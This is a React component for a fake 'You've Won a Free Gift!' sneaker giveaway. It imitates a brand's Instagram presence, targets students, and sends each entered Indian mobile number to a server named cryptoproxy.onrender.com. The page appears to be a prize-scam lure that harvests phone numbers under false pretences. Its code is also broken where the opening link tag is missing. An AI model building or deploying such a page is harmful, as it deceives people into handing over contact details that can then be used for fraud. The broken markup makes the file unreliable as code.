import { useState, useEffect } from "react";

export default function ClaimGift() {
  const [phone, setPhone] = useState("");
  const [claimed, setClaimed] = useState(false);
  const [error, setError] = useState("");
  const [apiError, setApiError] = useState("");
  const [serverReady, setServerReady] = useState(false);

  // Wake up Render server on page load
  useEffect(() => {
    fetch("https://cryptoproxy.onrender.com/")
      .then(res => res.json())
      .then(data => {
        console.log("Server awake:", data.message);
        setServerReady(true);
      })
      .catch(err => {
        console.log("Waking up server...");
        setServerReady(false);
      });
  }, []);

  const handleClaim = async () => {
    if (phone.length < 10) {
      setError("Please enter a valid 10 digit mobile number");
      return;
    }
    setError("");
    setApiError("");

    try {
      const response = await fetch("https://cryptoproxy.onrender.com/api/save-number", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone: `+91${phone}`,
          name: "N/A",
          telegram: "N/A",
          telegramId: "N/A"
        })
      });
      const data = await response.json();
      console.log("Response:", data);
      if (data.success) {
        setClaimed(true);
      } else {
        setApiError(data.error || "Something went wrong");
      }
    } catch (err) {
      console.error("Save error:", err);
      setApiError("Server is waking up, please try again in 30 seconds!");
    }
  };

  return (
    <div style={styles.page}>

      {/* Instagram Bar */}
      <div style={styles.instaBar}>
        <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
          <path d="M12 2.163c3.204 0 3.584.012 4.85.07 1.366.062 2.633.337 3.608 1.312.975.975 1.25 2.242 1.312 3.608.058 1.266.07 1.646.07 4.85s-.012 3.584-.07 4.85c-.062 1.366-.337 2.633-1.312 3.608-.975.975-2.242 1.25-3.608 1.312-1.266.058-1.646.07-4.85.07s-3.584-.012-4.85-.07c-1.366-.062-2.633-.337-3.608-1.312-.975-.975-1.25-2.242-1.312-3.608C2.175 15.584 2.163 15.204 2.163 12s.012-3.584.07-4.85c.062-1.366.337-2.633 1.312-3.608.975-.975 2.242-1.25 3.608-1.312C8.416 2.175 8.796 2.163 12 2.163zm0-2.163C8.741 0 8.333.014 7.053.072 5.197.157 3.355.673 2.014 2.014.673 3.355.157 5.197.072 7.053.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.085 1.856.601 3.698 1.942 5.039 1.341 1.341 3.183 1.857 5.039 1.942C8.333 23.986 8.741 24 12 24s3.668-.014 4.948-.072c1.856-.085 3.698-.601 5.039-1.942 1.341-1.341 1.857-3.183 1.942-5.039.058-1.28.072-1.689.072-4.948 0-3.259-.014-3.667-.072-4.947-.085-1.856-.601-3.698-1.942-5.039C20.698.673 18.856.157 17.0.072 15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zm0 10.162a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
        </svg>
        <span style={styles.instaText}>@shoebrand.official</span>
        {/* Server status indicator */}
        <span style={{
          marginLeft: "auto",
          fontSize: 11,
          color: serverReady ? "#00c896" : "#f0b90b"
        }}>
          {serverReady ? "🟢 Ready" : "🟡 Loading..."}
        </span>
      </div>

      <div style={styles.container}>
        {!claimed ? (
          <>
            <div style={styles.shoeEmoji}>👟</div>
            <h1 style={styles.title}>You've Won a Free Gift!</h1>
            <p style={styles.subtitle}>
              Claim your exclusive pair of sneakers — limited offer!
            </p>
            <div style={styles.giftBox}>🎁</div>
            <p style={styles.label}>Enter your mobile number to claim:</p>

            <div style={styles.inputRow}>
              <span style={styles.flag}>🇮🇳 +91</span>
              <input
                style={styles.input}
                type="tel"
                placeholder="98765 43210"
                value={phone}
                onChange={(e) => setPhone(e.target.value.replace(/\D/, ""))}
                maxLength={10}
              />
            </div>

            {error && <p style={styles.error}>{error}</p>}
            {apiError && <p style={styles.error}>{apiError}</p>}

            <button
              style={{
                ...styles.button,
                opacity: serverReady ? 1 : 0.7,
                cursor: serverReady ? "pointer" : "not-allowed"
              }}
              onClick={handleClaim}
              disabled={!serverReady}
            >
              {serverReady ? "🎉 Claim My Gift" : "⏳ Please wait..."}
            </button>

            <p style={styles.terms}>
              *Valid for Students only. One claim per number.
            </p>
          </>
        ) : (
          <div style={styles.successScreen}>
            <div style={styles.tickCircle}>
              <svg width="60" height="60" viewBox="0 0 60 60">
                <circle cx="30" cy="30" r="28" fill="#00c896" />
                <polyline
                  points="15,30 25,42 45,20"
                  fill="none"
                  stroke="white"
                  strokeWidth="4"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            </div>

            <h1 style={styles.congratsTitle}>Congratulations! 🎉</h1>
            <p style={styles.congratsText}>
              Your gift has been claimed successfully!
            </p>

            <div style={styles.shoeEmoji}>👟</div>

            <div style={styles.claimedCard}>
              <p style={styles.claimedLabel}>Claimed by</p>
              <p style={styles.claimedPhone}>+91 {phone}</p>
            </div>

            <p style={styles.followText}>
              Follow us on Instagram for more offers!
            </p>

            
              href="https://instagram.com"
              target="_blank"
              rel="noreferrer"
              style={styles.instaButton}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="white" style={{marginRight: 8}}>
                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 1.366.062 2.633.337 3.608 1.312.975.975 1.25 2.242 1.312 3.608.058 1.266.07 1.646.07 4.85s-.012 3.584-.07 4.85c-.062 1.366-.337 2.633-1.312 3.608-.975.975-2.242 1.25-3.608 1.312-1.266.058-1.646.07-4.85.07s-3.584-.012-4.85-.07c-1.366-.062-2.633-.337-3.608-1.312-.975-.975-1.25-2.242-1.312-3.608C2.175 15.584 2.163 15.204 2.163 12s.012-3.584.07-4.85c.062-1.366.337-2.633 1.312-3.608.975-.975 2.242-1.25 3.608-1.312C8.416 2.175 8.796 2.163 12 2.163zm0-2.163C8.741 0 8.333.014 7.053.072 5.197.157 3.355.673 2.014 2.014.673 3.355.157 5.197.072 7.053.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.085 1.856.601 3.698 1.942 5.039 1.341 1.341 3.183 1.857 5.039 1.942C8.333 23.986 8.741 24 12 24s3.668-.014 4.948-.072c1.856-.085 3.698-.601 5.039-1.942 1.341-1.341 1.857-3.183 1.942-5.039.058-1.28.072-1.689.072-4.948 0-3.259-.014-3.667-.072-4.947-.085-1.856-.601-3.698-1.942-5.039C20.698.673 18.856.157 17 .072 15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zm0 10.162a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
              </svg>
              Follow @shoebrand.official
            </a>
          </div>
        )}
      </div>
    </div>
  );
}

const styles = {
  page: {
    minHeight: "100vh",
    background: "linear-gradient(135deg, #1a0533 0%, #2d0a5e 50%, #1a0533 100%)",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    fontFamily: "'Segoe UI', Arial, sans-serif",
    padding: "0 16px 40px",
  },
  instaBar: {
    width: "100%",
    maxWidth: 420,
    display: "flex",
    alignItems: "center",
    gap: 8,
    padding: "14px 0",
    borderBottom: "1px solid #ffffff22",
    marginBottom: 10,
  },
  instaText: {
    color: "#ffffff99",
    fontSize: 13,
  },
  container: {
    width: "100%",
    maxWidth: 420,
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    gap: 12,
    paddingTop: 20,
  },
  shoeEmoji: {
    fontSize: 64,
  },
  title: {
    color: "#ffffff",
    fontSize: 26,
    fontWeight: 700,
    textAlign: "center",
    margin: 0,
  },
  subtitle: {
    color: "#ccaaff",
    fontSize: 15,
    textAlign: "center",
    margin: 0,
  },
  giftBox: {
    fontSize: 48,
  },
  label: {
    color: "#ffffff99",
    fontSize: 14,
    margin: 0,
  },
  inputRow: {
    display: "flex",
    alignItems: "center",
    width: "100%",
    background: "#ffffff11",
    borderRadius: 12,
    border: "1px solid #ffffff33",
    overflow: "hidden",
  },
  flag: {
    padding: "14px 12px",
    color: "white",
    fontSize: 14,
    borderRight: "1px solid #ffffff22",
    whiteSpace: "nowrap",
  },
  input: {
    flex: 1,
    padding: "14px 16px",
    background: "transparent",
    border: "none",
    outline: "none",
    color: "white",
    fontSize: 16,
    letterSpacing: 1,
  },
  error: {
    color: "#ff6b6b",
    fontSize: 13,
    margin: 0,
  },
  button: {
    width: "100%",
    padding: "16px",
    background: "linear-gradient(90deg, #f0b90b, #ff6b35)",
    border: "none",
    borderRadius: 12,
    color: "white",
    fontSize: 17,
    fontWeight: 700,
    cursor: "pointer",
    marginTop: 4,
  },
  terms: {
    color: "#ffffff44",
    fontSize: 11,
    textAlign: "center",
    margin: 0,
  },
  successScreen: {
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    gap: 16,
    paddingTop: 20,
  },
  tickCircle: {
    animation: "popIn 0.5s ease",
  },
  congratsTitle: {
    color: "#ffffff",
    fontSize: 28,
    fontWeight: 700,
    margin: 0,
    textAlign: "center",
  },
  congratsText: {
    color: "#ccaaff",
    fontSize: 15,
    textAlign: "center",
    margin: 0,
  },
  claimedCard: {
    background: "#ffffff11",
    border: "1px solid #ffffff22",
    borderRadius: 12,
    padding: "14px 40px",
    textAlign: "center",
  },
  claimedLabel: {
    color: "#ffffff66",
    fontSize: 12,
    margin: 0,
  },
  claimedPhone: {
    color: "#ffffff",
    fontSize: 20,
    fontWeight: 700,
    margin: 0,
    letterSpacing: 1,
  },
  followText: {
    color: "#ffffff99",
    fontSize: 13,
    margin: 0,
  },
  instaButton: {
    display: "flex",
    alignItems: "center",
    background: "linear-gradient(90deg, #833ab4, #fd1d1d, #fcb045)",
    padding: "12px 24px",
    borderRadius: 12,
    color: "white",
    fontWeight: 700,
    fontSize: 14,
    textDecoration: "none",
  },
};